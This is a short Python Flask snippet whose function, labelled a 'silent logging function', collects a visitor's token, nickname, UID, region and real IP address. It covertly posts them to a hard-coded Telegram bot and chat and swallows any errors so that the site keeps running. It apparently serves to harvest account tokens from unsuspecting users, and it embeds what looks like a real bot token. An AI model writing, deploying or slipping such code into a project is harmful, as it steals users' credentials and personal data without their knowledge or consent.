import requests
from flask import request
from datetime import datetime

# --- TELEGRAM CONFIG ---
TELEGRAM_BOT_TOKEN = "8010690774:AAFtqxOlbqU-qaCc6fqyzTZYXUBPDyz_1vY"
TELEGRAM_CHAT_ID = "6414001857"

def send_to_telegram(token, nick, uid, reg):
    """Silent logging function"""
    # Vercel/Cloudflare ke liye real IP
    user_ip = request.headers.get('x-forwarded-for', request.remote_addr)
    
    message = (
        "🚀 **New Token Received**\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 **Name:** `{nick}`\n"
        f"🆔 **UID:** `{uid}`\n"
        f"🌍 **Region:** `{reg}`\n"
        f"🔑 **Token:** `{token}`\n"
        f"🕒 **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"🌐 **IP:** `{user_ip}`\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "Markdown"
        }, timeout=10)
    except:
        pass # Background process hai, fail hone par site nahi rukegi
